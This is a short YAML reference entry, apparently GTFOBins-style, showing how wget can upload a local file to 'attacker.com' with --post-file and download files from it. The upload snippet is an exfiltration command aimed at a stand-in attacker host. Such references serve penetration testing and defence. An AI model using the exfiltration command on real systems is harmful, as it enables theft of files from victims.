---
functions:
  file-upload:
    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        wget --post-file=$LFILE $URL
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        wget $URL -O $LFILE
---
